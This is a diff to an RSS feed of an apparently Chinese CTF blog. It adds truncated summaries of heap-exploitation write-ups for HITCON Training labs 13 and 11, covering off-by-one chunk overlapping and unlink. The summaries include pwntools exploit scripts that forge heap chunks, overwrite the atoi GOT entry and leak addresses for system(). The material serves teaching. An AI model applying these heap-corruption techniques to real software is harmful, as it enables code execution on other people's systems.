@@ -295,6 +295,44 @@ exp #!/usr/bin/python3from pwn import *context(arch = &amp;#39;amd64&amp;#39;,
     </item>
     
     <item>
+      <title>overlapping例题-HITCON_Training_lab13</title>
+      <link>https://jellyfish-pro.github.io/ctf/overlapping%E4%BE%8B%E9%A2%98-hitcon_training_lab13/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/ctf/overlapping%E4%BE%8B%E9%A2%98-hitcon_training_lab13/</guid>
+      <description>overlapping例题-HITCON_Training_lab13 写在前面
+题目：HITCON-Training/LAB/lab13 at master · scwuaptx/HITCON-Training · GitHub
+虽然overlapping这个技术逻辑上不复杂，但这道题的利用还是挺麻烦的。
+不过这道题也算是独立做出来的第一道题，从发现漏洞点，到成功利用都没有看其他的资料。
+程序逻辑 首先我们了解一下程序创建heap的基本逻辑：
+我们可以将上面的流程简化为：
+可以看到，如果要创建一个heap，则会创建两个chunk。
+这是heap逻辑上的结构，而在内存中，如果我们创建两个heap，所有的chunk的排列方式位：
+漏洞逻辑 漏洞点在edit_heap()函数，按理来说cread_heap函数也有，但这里我们详细说edit_heap函数。
+可以看到这里的read_input函数的第二个函数，将heap的content大小传入其中，并在函数中采用read函数读取content大小的字符串：
+问题在于传入read函数的size大小，是content的大小，但read函数是从0开始计算的。
+也就是如果传入的是26，那么read函数会读取27个字节。
+这样就发生了off_by_one漏洞。
+又因为上面堆的结构，我们可以通过off_by_one覆盖chunk的size，从而实现overlapping：
+这时我们再free掉heap2的两个chunk，这时堆的结构就会变成：
+漏洞利用 上面说到了这个漏洞可以使用overlapping，那么我们需要考虑，overlapping之后，我们需要控制什么呢？很明显我们需要控制heap_manage中content_chunk指针。
+首先我们先创建三个heap，那么程序就会创建六个chunk，在堆中的分布如下：
+create(&amp;#39;24&amp;#39;, &amp;#39;a&amp;#39;*24)create(&amp;#39;16&amp;#39;, &amp;#39;b&amp;#39;*16)create(&amp;#39;16&amp;#39;, &amp;#39;c&amp;#39;*16) 这时我们通过heap1的content覆盖掉heap2_manage_chunk的size：
+overflow = b&amp;#39;a&amp;#39;*24 + b&amp;#39;\x81&amp;#39;edit(&amp;#39;0&amp;#39;, overflow) 这时我们再free掉heap1和heap2。
+delete(&amp;#39;0&amp;#39;)delete(&amp;#39;1&amp;#39;) 注意这里需要先free掉heap1，再free掉heap2，原因是先让heap1进入fastbins。
+这时，fastbin的结构如下：
+这时我们需要先申请一个heap，来消耗掉fastbin的0x20链表中的前两个chunk。
+然后再申请一个chunk为0x80大小的content。这样就可以控制heap3的heap3_manage_chunk。
+**注意：**这里一定要先申请一个heap，否则在覆盖heap3_manage_chunk时，会破坏heap2_manage_chunk的结构。
+这里我们创建heap2时就输入content，覆盖掉heap3_manage_chunk中user_data的低八字节。
+create(&amp;#39;16&amp;#39;, &amp;#39;d&amp;#39;*16)payload = b&amp;#39;a&amp;#39;*0x40 + p64(16) + p64(0x602060)create(&amp;#39;112&amp;#39;, payload) 此时堆的结构如下：
+**注意：**带颜色的部分是原本的堆结构，新的结构是白字所示
+可以看到此时，如果我们编辑heap2的content，就会破坏heap1_manage_chunk，但是因为heap1没什么用，破坏就破坏掉吧。
+这里我们修改，让其指向atoi函数的got表，然后show(heap3)，就可以将atoi的地址打印出来，这样就可以获得基地址，计算出system函数地址。
+show(&amp;#39;2&amp;#39;)p.recvuntil(&amp;#39;Content : &amp;#39;)atoi = u64(p.</description>
+    </item>
+    
+    <item>
       <title>ret2csuinit_new</title>
       <link>https://jellyfish-pro.github.io/ctf/ret2csuinit_new/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -597,6 +635,30 @@ void__attribute__ ((noreturn))__stack_chk_fail (void){__fortify_fail_abort (
 notelist[3]的结构就是上面这样，这时候我们再将想要访问的地址，覆盖掉notelist[0]的print_note_content函数指针。
 同时再打印notelist[0]，就可以实现任意地址访问。
 from pwn import *context.log_level = &amp;#39;debug&amp;#39;p = process(&amp;#39;./hacknote&amp;#39;)magic = 0x8048986def mune(sele):p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.sendline(sele)def add(size, content):p.recvuntil(&amp;#39;Note size :&amp;#39;)p.sendline(size)p.recvuntil(&amp;#39;Content :&amp;#39;)p.sendline(content)def delet(index):p.recvuntil(&amp;#39;Index :&amp;#39;)p.sendline(index)def print(index):p.recvuntil(&amp;#39;Index :&amp;#39;)p.send(index)mune(&amp;#34;1&amp;#34;)add(&amp;#39;16&amp;#39;, &amp;#39;aaaaaa&amp;#39;)mune(&amp;#39;1&amp;#39;)add(&amp;#39;16&amp;#39;, &amp;#39;bbbbbb&amp;#39;)mune(&amp;#39;2&amp;#39;)delet(&amp;#39;0&amp;#39;)mune(&amp;#39;2&amp;#39;)delet(&amp;#39;1&amp;#39;)gdb.</description>
+    </item>
+    
+    <item>
+      <title>unlink例题-HITCON_Training_lab11-2</title>
+      <link>https://jellyfish-pro.github.io/ctf/unlink%E4%BE%8B%E9%A2%98-hitcon_training_lab11-2/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/ctf/unlink%E4%BE%8B%E9%A2%98-hitcon_training_lab11-2/</guid>
+      <description>unlink例题-HITCON_Training_lab11-2 写在前面
+HITCON_Training_lab11这道题有两种解法：
+因为是unlink的例题，所以这里只会说到unlink
+漏洞分析 漏洞点在修改item的函数中：change_item()
+通过这个逻辑，可以看到虽然对输入的字符有限制，但是并没有检查输入的长度是否大于堆本来的长度。故这里存在堆溢出。
+所以我们可以创建如下的堆结构来实现unlink：
+这时只要我们free掉chunk1，unlink就可以让chunk0的指针指向&amp;amp;chunk0 - 3的地方：
+free之前，存放chunk0的地址为0x6020C8，chunk0的值为199e030
+free之后，原本存放chunk0地址的0x6020C8就变成了0x6020C8 - 3*8 = 0x6020b0
+在ida中我们可以看到这个地址在bss段上，还没有初始化。
+不过因为这个地址在我们chunk0的上方，所以我们可以向下修改chunk0的指针：
+这里我们将地址改为atoi的got表地址
+因为这时&amp;amp;chunk0已经指向了atoi的got表，所以这时我们再向chunk0中写入地址，就可以覆盖掉原有的atoi的got表。
+这里就可以看到，我们已经将atoi的got表修改成了magic。
+当然，也有方法可以直接拿到shell，不过这里就不多说了。
+#!/usr/bin/python3from pwn import *context.log_level = &amp;#39;debug&amp;#39;p = process(&amp;#39;./bamboobox&amp;#39;)def additem(length,name):p.recvuntil(&amp;#34;:&amp;#34;)p.sendline(&amp;#34;2&amp;#34;)p.recvuntil(&amp;#34;:&amp;#34;)p.sendline(str(length))p.recvuntil(&amp;#34;:&amp;#34;)p.sendline(name)def modify(idx,length,name):p.recvuntil(&amp;#34;:&amp;#34;)p.sendline(&amp;#34;3&amp;#34;)p.recvuntil(&amp;#34;:&amp;#34;)p.sendline(str(idx))p.recvuntil(&amp;#34;:&amp;#34;)p.sendline(str(length))p.recvuntil(&amp;#34;:&amp;#34;)p.sendline(name)def remove(idx):p.recvuntil(&amp;#34;:&amp;#34;)p.sendline(&amp;#34;4&amp;#34;)p.recvuntil(&amp;#34;:&amp;#34;)p.sendline(str(idx))def show():p.recvuntil(&amp;#34;:&amp;#34;)p.sendline(&amp;#34;1&amp;#34;)additem(0x40,&amp;#34;a&amp;#34;*8)#0additem(0x80,&amp;#34;b&amp;#34;*8)#1additem(0x40,&amp;#34;c&amp;#34;*8)#2chunk0_ptr = 0x6020C8fake_chunk = p64(0) + p64(0x41) + p64(chunk0_ptr - 0x18) + p64(chunk0_ptr - 0x10) + b&amp;#39;a&amp;#39;*0x20fake_chunk += p64(0x40) + p64(0x90)modify(0 ,0x80, fake_chunk)remove(1)atoi = p64(0)*2 + p64(0x20) + p64(0x602068) #got.</description>
     </item>
     
     <item>
